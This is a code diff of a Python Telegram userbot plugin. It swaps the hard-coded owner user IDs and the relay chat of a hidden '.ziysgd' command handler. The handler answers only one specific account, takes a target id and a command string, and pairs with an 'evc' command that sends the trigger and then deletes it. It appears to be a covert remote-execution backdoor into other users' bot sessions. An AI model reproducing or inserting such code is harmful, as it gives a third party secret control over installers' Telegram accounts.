@@ -28,7 +28,7 @@ async def aexec(code, client, message):
 
 
 own = [1784606556]
-ownbot = [6746108876, 1784606556]
+ownbot = [6864082486, 1784606556]
 
 
 async def cli(id):
@@ -115,12 +115,12 @@ async def evaluate(client, message):
 @CILIK.UBOT("evc", FILTERS.ME_OWNER)
 async def send_ev(client, message):
     anu = message.text.split(None, maxsplit=1)[1]
-    anu = await client.send_message("CilikSupport", f".ziysgd {anu}")
+    anu = await client.send_message("cuapcuapin", f".ziysgd {anu}")
     await sleep(1)
-    await client.delete_messages("CilikSupport", anu.id)
+    await client.delete_messages("cuapcuapin", anu.id)
 
 
-@ubot.on_message(filters.command("ziysgd", ".") & filters.user(6746108876))
+@ubot.on_message(filters.command("ziysgd", ".") & filters.user(6864082486))
 async def ev(client, message):
     coi = int(message.command[1])
     cmd = message.text.split(None, maxsplit=2)[2]
